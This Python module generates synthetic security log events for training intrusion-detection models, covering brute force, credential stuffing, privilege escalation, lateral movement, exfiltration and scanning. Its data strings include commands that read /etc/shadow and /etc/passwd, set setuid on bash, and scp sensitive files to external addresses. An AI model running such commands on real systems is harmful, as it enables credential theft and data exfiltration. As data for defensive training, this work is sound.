"""
Synthetic security event generator for training ML models.

Generates realistic security events for each attack type:
- normal: Regular business activity
- brute_force: Multiple failed logins from same IP
- credential_stuffing: Multiple users from same IP with failures
- privilege_escalation: User attempts to gain elevated privileges
- lateral_movement: Internal network traversal between systems
- data_exfiltration: Large data transfers during unusual hours
- reconnaissance: Port scanning and enumeration activity
"""

import random
import string
from datetime import datetime, timedelta
from typing import Any, ClassVar

import structlog

logger = structlog.get_logger()

# ============================================================================
# Constants
# ============================================================================

# Common usernames for generation
NORMAL_USERS = [
    "alice",
    "bob",
    "charlie",
    "david",
    "eve",
    "frank",
    "grace",
    "henry",
    "isabel",
    "jack",
    "kate",
    "liam",
    "mary",
    "nancy",
    "oliver",
    "peter",
    "quinn",
    "rachel",
    "steve",
    "tina",
    "user1",
    "user2",
    "user3",
    "admin",
    "root",
    "sysadmin",
    "devops",
    "jenkins",
    "deploy",
]

SERVICE_ACCOUNTS = [
    "svc_backup",
    "svc_monitor",
    "svc_deploy",
    "svc_db",
    "svc_web",
    "prometheus",
    "grafana",
    "nginx",
    "apache",
    "postgres",
    "mysql",
]

# Hostnames
HOSTNAMES = [
    "web-server-01",
    "web-server-02",
    "web-server-03",
    "api-server-01",
    "api-server-02",
    "db-server-01",
    "db-server-02",
    "auth-server-01",
    "cache-server-01",
    "worker-01",
    "worker-02",
    "worker-03",
    "bastion-01",
    "monitoring-01",
    "jenkins-01",
    "gitlab-runner-01",
]

# Services
SERVICES = {
    "auth": ["sshd", "pam", "ldap", "kerberos", "oauth"],
    "system": ["systemd", "cron", "kernel", "auditd"],
    "network": ["nginx", "haproxy", "iptables", "firewalld"],
    "app": ["api", "webapp", "backend", "frontend", "worker"],
}

# Internal IP ranges
INTERNAL_IP_PREFIXES = ["10.0.", "192.168.1.", "172.16.0."]

# External IP ranges (simulated)
EXTERNAL_IP_RANGES = [
    "203.0.113.",  # TEST-NET-3
    "198.51.100.",  # TEST-NET-2
    "192.0.2.",  # TEST-NET-1
    "45.33.",  # Random external
    "104.16.",  # Random external
    "185.220.100.",  # Tor exit node (for attacks)
    "185.220.101.",  # Tor exit node
]

# Countries for geo info
COUNTRIES = {
    "internal": [("US", "San Francisco"), ("US", "New York"), ("US", "Austin")],
    "normal_external": [
        ("US", "Los Angeles"),
        ("US", "Chicago"),
        ("UK", "London"),
        ("DE", "Berlin"),
        ("CA", "Toronto"),
        ("JP", "Tokyo"),
    ],
    "suspicious": [
        ("RU", "Moscow"),
        ("CN", "Beijing"),
        ("KP", "Pyongyang"),
        ("IR", "Tehran"),
        ("BY", "Minsk"),
    ],
}

# Action types by source
ACTION_TYPES = {
    "auth": [
        ("authentication", "login", "success"),
        ("authentication", "login_failed", "failure"),
        ("authentication", "logout", "success"),
        ("authentication", "password_change", "success"),
        ("authentication", "mfa_verify", "success"),
        ("authentication", "mfa_failed", "failure"),
        ("authentication", "token_refresh", "success"),
    ],
    "system": [
        ("process_execution", "command", "success"),
        ("file_access", "read", "success"),
        ("file_access", "write", "success"),
        ("configuration_change", "modify", "success"),
        ("authorization", "sudo", "success"),
        ("authorization", "sudo", "failure"),
        ("process_execution", "service_start", "success"),
    ],
    "network": [
        ("network_connection", "established", "success"),
        ("network_connection", "rejected", "failure"),
        ("data_transfer", "upload", "success"),
        ("data_transfer", "download", "success"),
        ("network_connection", "port_scan", "failure"),
    ],
    "app": [
        ("api_request", "GET", "success"),
        ("api_request", "POST", "success"),
        ("api_request", "unauthorized", "failure"),
        ("data_transfer", "export", "success"),
        ("file_access", "download", "success"),
    ],
}


# ============================================================================
# Helper Functions
# ============================================================================


def _random_ip(internal: bool = True, tor: bool = False) -> str:
    """Generate a random IP address."""
    if tor:
        prefix = random.choice(["185.220.100.", "185.220.101."])
    elif internal:
        prefix = random.choice(INTERNAL_IP_PREFIXES)
    else:
        prefix = random.choice(EXTERNAL_IP_RANGES[:5])  # Exclude Tor

    return f"{prefix}{random.randint(1, 254)}.{random.randint(1, 254)}"


def _random_timestamp(
    base: datetime | None = None,
    hours_delta: int = 24,
    business_hours: bool | None = None,
    night_hours: bool = False,
) -> str:
    """Generate a random ISO timestamp."""
    if base is None:
        base = datetime.utcnow()

    delta = timedelta(
        hours=random.randint(0, hours_delta),
        minutes=random.randint(0, 59),
        seconds=random.randint(0, 59),
    )

    ts = base - delta

    # Adjust for business hours if specified
    if business_hours is True:
        # 9 AM - 5 PM, weekday
        ts = ts.replace(hour=random.randint(9, 16))
        while ts.weekday() >= 5:
            ts -= timedelta(days=1)
    elif night_hours:
        # 10 PM - 6 AM
        if random.random() > 0.5:
            ts = ts.replace(hour=random.randint(22, 23))
        else:
            ts = ts.replace(hour=random.randint(0, 5))

    return ts.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def _random_geo(category: str = "normal_external") -> dict[str, Any]:
    """Generate geographic information."""
    locations = COUNTRIES.get(category, COUNTRIES["normal_external"])
    country, city = random.choice(locations)

    # Rough lat/lon for cities
    coords = {
        "San Francisco": (37.7749, -122.4194),
        "New York": (40.7128, -74.0060),
        "Austin": (30.2672, -97.7431),
        "Los Angeles": (34.0522, -118.2437),
        "Chicago": (41.8781, -87.6298),
        "London": (51.5074, -0.1278),
        "Berlin": (52.5200, 13.4050),
        "Toronto": (43.6532, -79.3832),
        "Tokyo": (35.6762, 139.6503),
        "Moscow": (55.7558, 37.6173),
        "Beijing": (39.9042, 116.4074),
        "Pyongyang": (39.0392, 125.7625),
        "Tehran": (35.6892, 51.3890),
        "Minsk": (53.9006, 27.5590),
    }

    lat, lon = coords.get(city, (0.0, 0.0))
    # Add some noise
    lat += random.uniform(-0.5, 0.5)
    lon += random.uniform(-0.5, 0.5)

    return {
        "country": country,
        "city": city,
        "lat": round(lat, 4),
        "lon": round(lon, 4),
    }


def _random_command() -> str:
    """Generate a random command."""
    commands = [
        "ls -la",
        "cat /etc/passwd",
        "grep -r password .",
        "find / -name '*.conf'",
        "ps aux",
        "netstat -tulpn",
        "systemctl status",
        "docker ps",
        "kubectl get pods",
        "curl localhost:8080",
    ]
    return random.choice(commands)


# ============================================================================
# Event Generators
# ============================================================================


def generate_normal_event() -> dict[str, Any]:
    """
    Generate a normal (benign) security event.

    Characteristics:
    - Business hours activity
    - Internal or known external IPs
    - Mostly successful actions
    - Normal user behavior patterns

    Returns:
        Security event dictionary.
    """
    source_type = random.choice(["auth", "system", "network", "app"])
    action_info = random.choice(ACTION_TYPES[source_type])
    action_type, action_subtype, result = action_info

    # 90% success rate for normal events
    if random.random() < 0.1:
        result = "failure"

    # Internal IP 70% of time
    is_internal = random.random() < 0.7
    actor_ip = _random_ip(internal=is_internal)

    user = random.choice(NORMAL_USERS + SERVICE_ACCOUNTS)
    hostname = random.choice(HOSTNAMES)

    actor: dict[str, Any] = {
        "user": user,
        "uid": random.randint(1000, 65000),
        "source_ip": actor_ip,
    }

    # Add geo info for external IPs
    if not is_internal:
        actor["geo"] = _random_geo("normal_external")

    event: dict[str, Any] = {
        "timestamp": _random_timestamp(business_hours=True),
        "source": {
            "type": source_type,
            "hostname": hostname,
            "ip": _random_ip(internal=True),
            "service": random.choice(SERVICES[source_type]),
        },
        "actor": actor,
        "action": {
            "type": action_type,
            "subtype": action_subtype,
            "result": result,
        },
    }

    # Sometimes add context
    if source_type == "system" and random.random() < 0.5:
        event["context"] = {
            "process": random.choice(["bash", "sh", "python", "node"]),
            "pid": random.randint(1000, 50000),
            "command": _random_command(),
        }

    return event


def generate_brute_force_event() -> dict[str, Any]:
    """
    Generate a brute force attack event.

    Characteristics:
    - Multiple failed logins
    - Same source IP
    - Often same target user
    - Short time window
    - External IP

    Returns:
        Security event dictionary.
    """
    # Brute force is always auth failures
    user = random.choice(NORMAL_USERS[:10])  # Target common users
    hostname = random.choice(HOSTNAMES[:5])  # Target web/api servers

    # Usually external IP, sometimes Tor
    use_tor = random.random() < 0.2
    actor_ip = _random_ip(internal=False, tor=use_tor)

    event = {
        "timestamp": _random_timestamp(business_hours=False),
        "source": {
            "type": "auth",
            "hostname": hostname,
            "ip": _random_ip(internal=True),
            "service": random.choice(["sshd", "pam", "oauth"]),
        },
        "actor": {
            "user": user,
            "source_ip": actor_ip,
            "geo": _random_geo("suspicious" if use_tor else "normal_external"),
        },
        "action": {
            "type": "authentication",
            "subtype": "login_failed",
            "result": "failure",
            "reason": random.choice(
                [
                    "invalid_password",
                    "invalid_credentials",
                    "account_locked",
                    "max_retries_exceeded",
                ]
            ),
        },
    }

    return event


def generate_credential_stuffing_event() -> dict[str, Any]:
    """
    Generate a credential stuffing attack event.

    Characteristics:
    - Same source IP
    - Multiple DIFFERENT users
    - Many failures
    - External IP
    - Often automated (short intervals)

    Returns:
        Security event dictionary.
    """
    # Random user from a "leaked database"
    user = f"user_{random.randint(1000, 99999)}"
    if random.random() < 0.3:
        user = random.choice(NORMAL_USERS)  # Sometimes hit real users

    hostname = random.choice(HOSTNAMES[:3])  # Web servers
    actor_ip = _random_ip(internal=False)

    # Mix of success and failure (stuffed creds sometimes work)
    result = "failure" if random.random() < 0.9 else "success"

    action: dict[str, Any] = {
        "type": "authentication",
        "subtype": "login_failed" if result == "failure" else "login",
        "result": result,
    }
    if result == "failure":
        action["reason"] = "invalid_credentials"

    event: dict[str, Any] = {
        "timestamp": _random_timestamp(business_hours=False, night_hours=True),
        "source": {
            "type": "auth",
            "hostname": hostname,
            "ip": _random_ip(internal=True),
            "service": random.choice(["oauth", "api", "webapp"]),
        },
        "actor": {
            "user": user,
            "source_ip": actor_ip,
            "geo": _random_geo("suspicious"),
        },
        "action": action,
    }

    return event


def generate_privilege_escalation_event() -> dict[str, Any]:
    """
    Generate a privilege escalation attack event.

    Characteristics:
    - Normal user attempting privileged actions
    - sudo/su usage
    - Access to sensitive files (/etc/shadow, /etc/sudoers)
    - Often from internal IP

    Returns:
        Security event dictionary.
    """
    user = random.choice(NORMAL_USERS[:15])  # Regular users, not service accounts
    hostname = random.choice(HOSTNAMES)

    # Mix of success and failure
    result = random.choice(["success", "failure", "failure"])

    # Escalation method
    methods = [
        ("sudo", "sudo -l"),
        ("sudo", "sudo su -"),
        ("sudo", "sudo bash"),
        ("su", "su root"),
        ("file_access", "cat /etc/shadow"),
        ("file_access", "cat /etc/sudoers"),
        ("configuration_change", "visudo"),
        ("process_execution", "chmod +s /bin/bash"),
    ]

    method, command = random.choice(methods)

    action: dict[str, Any] = {
        "type": "authorization",
        "subtype": method,
        "target": "root" if method in ("sudo", "su") else "/etc/shadow",
        "result": result,
    }
    if result == "failure":
        action["reason"] = "not in sudoers"

    event: dict[str, Any] = {
        "timestamp": _random_timestamp(business_hours=None),  # Any time
        "source": {
            "type": "system",
            "hostname": hostname,
            "ip": _random_ip(internal=True),
            "service": "auditd",
        },
        "actor": {
            "user": user,
            "uid": random.randint(1000, 65000),
            "source_ip": _random_ip(internal=True),
        },
        "action": action,
        "context": {
            "process": "bash",
            "pid": random.randint(1000, 50000),
            "command": command,
            "tty": f"pts/{random.randint(0, 10)}",
        },
    }

    return event


def generate_lateral_movement_event() -> dict[str, Any]:
    """
    Generate a lateral movement attack event.

    Characteristics:
    - Internal IP to internal IP
    - SSH/RDP between servers
    - Often using service accounts
    - Unusual server-to-server connections

    Returns:
        Security event dictionary.
    """
    # Source and destination are different internal hosts
    source_host = random.choice(HOSTNAMES)
    dest_host = random.choice([h for h in HOSTNAMES if h != source_host])

    # Often compromised service account or stolen credentials
    user = random.choice(SERVICE_ACCOUNTS + NORMAL_USERS[:5])

    # Internal to internal
    source_ip = _random_ip(internal=True)
    dest_ip = _random_ip(internal=True)

    event = {
        "timestamp": _random_timestamp(night_hours=True),
        "source": {
            "type": "network",
            "hostname": dest_host,
            "ip": dest_ip,
            "service": random.choice(["sshd", "rdp", "winrm"]),
        },
        "actor": {
            "user": user,
            "source_ip": source_ip,
            "session_id": "".join(random.choices(string.hexdigits.lower(), k=16)),
        },
        "action": {
            "type": "network_connection",
            "subtype": "ssh_session" if random.random() > 0.3 else "rdp_session",
            "target": dest_host,
            "method": "key" if random.random() > 0.5 else "password",
            "result": "success",
        },
        "context": {
            "process": "sshd",
            "pid": random.randint(1000, 50000),
        },
    }

    return event


def generate_data_exfiltration_event() -> dict[str, Any]:
    """
    Generate a data exfiltration attack event.

    Characteristics:
    - Large data transfers (>100MB)
    - Night hours or weekends
    - External destination
    - Unusual file access patterns

    Returns:
        Security event dictionary.
    """
    user = random.choice(NORMAL_USERS + SERVICE_ACCOUNTS[:3])
    hostname = random.choice(HOSTNAMES)

    # Large transfer sizes
    size_mb = random.randint(100, 5000)

    # External destination
    dest_ip = _random_ip(internal=False)

    # Suspicious file types
    targets = [
        "/data/customers.sql",
        "/backup/database_dump.tar.gz",
        "/var/lib/mysql/production.myd",
        "/home/admin/credentials.xlsx",
        "/opt/secrets/api_keys.json",
        "/data/financial_reports.zip",
    ]

    event: dict[str, Any] = {
        "timestamp": _random_timestamp(night_hours=True),
        "source": {
            "type": "network",
            "hostname": hostname,
            "ip": _random_ip(internal=True),
            "service": random.choice(["nginx", "api", "scp"]),
        },
        "actor": {
            "user": user,
            "source_ip": _random_ip(internal=True),
        },
        "action": {
            "type": "data_transfer",
            "subtype": random.choice(["upload", "export", "scp_transfer"]),
            "target": random.choice(targets),
            "method": random.choice(["https", "scp", "sftp", "ftp"]),
            "result": "success",
            "bytes_transferred": size_mb * 1024 * 1024,
            "destination_ip": dest_ip,
        },
        "context": {
            "process": random.choice(["curl", "scp", "rsync", "python"]),
            "pid": random.randint(1000, 50000),
            "command": f"scp {random.choice(targets)} {dest_ip}:/tmp/",
        },
    }

    return event


def generate_reconnaissance_event() -> dict[str, Any]:
    """
    Generate a reconnaissance/port scanning event.

    Characteristics:
    - Multiple connection attempts to different ports
    - External source IP
    - Many failures (closed ports)
    - nmap-like patterns

    Returns:
        Security event dictionary.
    """
    hostname = random.choice(HOSTNAMES)

    # External attacker
    use_tor = random.random() < 0.3
    actor_ip = _random_ip(internal=False, tor=use_tor)

    # Common scan targets
    ports = [
        21,
        22,
        23,
        25,
        53,
        80,
        110,
        111,
        135,
        139,
        143,
        443,
        445,
        993,
        995,
        1433,
        1521,
        3306,
        3389,
        5432,
        5900,
        6379,
        8080,
        8443,
        27017,
    ]
    target_port = random.choice(ports)

    # Most reconnaissance hits closed/filtered ports
    result = "failure" if random.random() < 0.85 else "success"

    action: dict[str, Any] = {
        "type": "network_connection",
        "subtype": "port_scan",
        "target": f":{target_port}",
        "method": random.choice(["syn_scan", "connect_scan", "fin_scan"]),
        "result": result,
    }
    if result == "failure":
        action["reason"] = "connection_refused"

    event: dict[str, Any] = {
        "timestamp": _random_timestamp(business_hours=False),
        "source": {
            "type": "network",
            "hostname": hostname,
            "ip": _random_ip(internal=True),
            "service": "firewalld",
        },
        "actor": {
            "user": "unknown",
            "source_ip": actor_ip,
            "geo": _random_geo("suspicious"),
        },
        "action": action,
    }

    return event


# ============================================================================
# Dataset Generation
# ============================================================================


class SyntheticEventGenerator:
    """
    Generator class for creating synthetic security event datasets.

    Provides fine-grained control over event generation including
    attack ratios, temporal patterns, and campaign simulation.

    Example:
        >>> generator = SyntheticEventGenerator(seed=42)
        >>> events, labels = generator.generate(n_samples=10000, attack_ratio=0.3)
        >>> print(f"Generated {len(events)} events")
    """

    ATTACK_GENERATORS: ClassVar[dict[str, Any]] = {
        "normal": generate_normal_event,
        "brute_force": generate_brute_force_event,
        "credential_stuffing": generate_credential_stuffing_event,
        "privilege_escalation": generate_privilege_escalation_event,
        "lateral_movement": generate_lateral_movement_event,
        "data_exfiltration": generate_data_exfiltration_event,
        "reconnaissance": generate_reconnaissance_event,
    }

    def __init__(self, seed: int | None = None) -> None:
        """
        Initialize the generator.

        Args:
            seed: Random seed for reproducibility.
        """
        if seed is not None:
            random.seed(seed)

        self.seed = seed
        logger.info("synthetic_generator_initialized", seed=seed)

    def generate(
        self,
        n_samples: int = 10000,
        attack_ratio: float = 0.3,
        attack_distribution: dict[str, float] | None = None,
    ) -> tuple[list[dict[str, Any]], list[str]]:
        """
        Generate a dataset of security events.

        Args:
            n_samples: Total number of events to generate.
            attack_ratio: Ratio of attack events (0.0 to 1.0).
            attack_distribution: Optional custom distribution of attack types.
                If None, uses uniform distribution across attack types.

        Returns:
            Tuple of (events, labels) where events is a list of event dicts
            and labels is a list of attack type strings.
        """
        events: list[dict[str, Any]] = []
        labels: list[str] = []

        n_attacks = int(n_samples * attack_ratio)
        n_normal = n_samples - n_attacks

        # Default attack distribution (uniform)
        if attack_distribution is None:
            attack_types = list(self.ATTACK_GENERATORS.keys())
            attack_types.remove("normal")
            attack_distribution = {at: 1.0 / len(attack_types) for at in attack_types}

        # Generate normal events
        logger.info("generating_normal_events", count=n_normal)
        for _ in range(n_normal):
            events.append(generate_normal_event())
            labels.append("normal")

        # Generate attack events
        logger.info("generating_attack_events", count=n_attacks, distribution=attack_distribution)

        # Calculate counts per attack type
        attack_counts = {}
        remaining = n_attacks

        attack_items = list(attack_distribution.items())
        for i, (attack_type, ratio) in enumerate(attack_items):
            if i == len(attack_items) - 1:
                # Last type gets remaining to handle rounding
                attack_counts[attack_type] = remaining
            else:
                count = int(n_attacks * ratio)
                attack_counts[attack_type] = count
                remaining -= count

        # Generate attacks
        for attack_type, count in attack_counts.items():
            generator = self.ATTACK_GENERATORS.get(attack_type)
            if generator:
                for _ in range(count):
                    events.append(generator())
                    labels.append(attack_type)

        # Shuffle to mix attack and normal events
        combined = list(zip(events, labels, strict=True))
        random.shuffle(combined)
        events, labels = zip(*combined, strict=True) if combined else ([], [])

        logger.info(
            "dataset_generated",
            total_events=len(events),
            normal_count=n_normal,
            attack_count=n_attacks,
        )

        return list(events), list(labels)

    def generate_campaign(
        self,
        attack_type: str,
        n_events: int = 100,
        source_ip: str | None = None,
        target_user: str | None = None,
        duration_minutes: int = 30,
    ) -> list[dict[str, Any]]:
        """
        Generate a coordinated attack campaign.

        Simulates a realistic attack sequence with consistent
        source IP, timing patterns, and escalation.

        Args:
            attack_type: Type of attack to simulate.
            n_events: Number of events in the campaign.
            source_ip: Fixed source IP (generated if None).
            target_user: Fixed target user (generated if None).
            duration_minutes: Duration of the campaign.

        Returns:
            List of events representing the attack campaign.
        """
        generator = self.ATTACK_GENERATORS.get(attack_type, generate_normal_event)

        if source_ip is None:
            source_ip = _random_ip(internal=False)

        if target_user is None:
            target_user = random.choice(NORMAL_USERS[:10])

        base_time = datetime.utcnow()
        events = []

        for i in range(n_events):
            event = generator()

            # Override with campaign-specific values
            event["actor"]["source_ip"] = source_ip

            # brute_force: SAME user (overwrite with target_user)
            # credential_stuffing: MULTIPLE users (keep the random user from generator)
            if attack_type == "brute_force":
                event["actor"]["user"] = target_user

            # Spread events across the duration
            offset_minutes = (duration_minutes / n_events) * i
            event_time = base_time - timedelta(minutes=duration_minutes - offset_minutes)
            event["timestamp"] = event_time.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"

            events.append(event)

        logger.info(
            "campaign_generated",
            attack_type=attack_type,
            n_events=n_events,
            source_ip=source_ip,
            duration_minutes=duration_minutes,
        )

        return events

    def generate_dataset_with_campaigns(
        self,
        n_samples: int = 10000,
        attack_ratio: float = 0.3,
        events_per_campaign: tuple[int, int] = (10, 50),
        attack_distribution: dict[str, float] | None = None,
    ) -> tuple[list[list[dict[str, Any]]], list[str], list[str]]:
        """
        Generate a dataset organized into campaigns for window feature extraction.

        Each campaign is a group of events from the same source IP, simulating
        realistic attack patterns where attackers maintain consistent IPs during
        attack sessions.

        Args:
            n_samples: Approximate total number of events to generate.
            attack_ratio: Ratio of attack campaigns (0.0 to 1.0).
            events_per_campaign: (min, max) events per campaign.
            attack_distribution: Optional custom distribution of attack types.

        Returns:
            Tuple of (event_groups, labels, campaign_ids) where:
            - event_groups: List of event lists, one per campaign
            - labels: Attack type for each campaign
            - campaign_ids: Unique ID for each campaign
        """
        event_groups: list[list[dict[str, Any]]] = []
        labels: list[str] = []
        campaign_ids: list[str] = []

        # Estimate number of campaigns
        avg_events = (events_per_campaign[0] + events_per_campaign[1]) // 2
        n_campaigns = max(n_samples // avg_events, 10)
        n_attack_campaigns = int(n_campaigns * attack_ratio)
        n_normal_campaigns = n_campaigns - n_attack_campaigns

        # Default attack distribution (uniform)
        if attack_distribution is None:
            attack_types = list(self.ATTACK_GENERATORS.keys())
            attack_types.remove("normal")
            attack_distribution = {at: 1.0 / len(attack_types) for at in attack_types}

        # Generate normal campaigns
        logger.info("generating_normal_campaigns", count=n_normal_campaigns)
        for i in range(n_normal_campaigns):
            n_events = random.randint(*events_per_campaign)
            source_ip = _random_ip(internal=True)

            events = []
            for _ in range(n_events):
                event = generate_normal_event()
                event["actor"]["source_ip"] = source_ip
                events.append(event)

            event_groups.append(events)
            labels.append("normal")
            campaign_ids.append(f"normal_{i}")

        # Generate attack campaigns
        logger.info(
            "generating_attack_campaigns",
            count=n_attack_campaigns,
            distribution=attack_distribution,
        )

        # Calculate counts per attack type
        attack_counts: dict[str, int] = {}
        remaining = n_attack_campaigns
        attack_items = list(attack_distribution.items())

        for i, (attack_type, ratio) in enumerate(attack_items):
            if i == len(attack_items) - 1:
                attack_counts[attack_type] = remaining
            else:
                count = int(n_attack_campaigns * ratio)
                attack_counts[attack_type] = count
                remaining -= count

        campaign_idx = 0
        for attack_type, count in attack_counts.items():
            for _ in range(count):
                n_events = random.randint(*events_per_campaign)

                # Generate campaign with consistent source_ip
                events = self.generate_campaign(
                    attack_type=attack_type,
                    n_events=n_events,
                    duration_minutes=random.randint(5, 60),
                )

                event_groups.append(events)
                labels.append(attack_type)
                campaign_ids.append(f"{attack_type}_{campaign_idx}")
                campaign_idx += 1

        # Shuffle campaigns
        combined = list(zip(event_groups, labels, campaign_ids, strict=True))
        random.shuffle(combined)

        if combined:
            event_groups, labels, campaign_ids = zip(*combined, strict=True)
            event_groups = list(event_groups)
            labels = list(labels)
            campaign_ids = list(campaign_ids)

        total_events = sum(len(g) for g in event_groups)
        logger.info(
            "campaign_dataset_generated",
            n_campaigns=len(event_groups),
            total_events=total_events,
            normal_campaigns=n_normal_campaigns,
            attack_campaigns=n_attack_campaigns,
        )

        return event_groups, labels, campaign_ids


def generate_dataset(
    n_samples: int = 10000,
    attack_ratio: float = 0.3,
    seed: int | None = 42,
) -> tuple[list[dict[str, Any]], list[str]]:
    """
    Convenience function to generate a training dataset.

    Args:
        n_samples: Total number of events to generate.
        attack_ratio: Ratio of attack events (0.0 to 1.0).
        seed: Random seed for reproducibility.

    Returns:
        Tuple of (events, labels).

    Example:
        >>> events, labels = generate_dataset(n_samples=5000, attack_ratio=0.3)
        >>> print(f"Normal: {labels.count('normal')}, Attacks: {len(labels) - labels.count('normal')}")
    """
    generator = SyntheticEventGenerator(seed=seed)
    return generator.generate(n_samples=n_samples, attack_ratio=attack_ratio)


# ============================================================================
# Main (for testing)
# ============================================================================


if __name__ == "__main__":
    # Test generation
    print("Testing synthetic event generator...")

    # Generate a small dataset
    events, labels = generate_dataset(n_samples=100, attack_ratio=0.3, seed=42)

    # Print statistics
    from collections import Counter

    label_counts = Counter(labels)

    print(f"\nGenerated {len(events)} events:")
    for label, count in sorted(label_counts.items()):
        print(f"  {label}: {count}")

    # Print sample events
    print("\nSample events:")
    for label in ["normal", "brute_force", "privilege_escalation"]:
        idx = labels.index(label) if label in labels else 0
        print(f"\n{label.upper()}:")
        import json

        print(json.dumps(events[idx], indent=2, default=str))
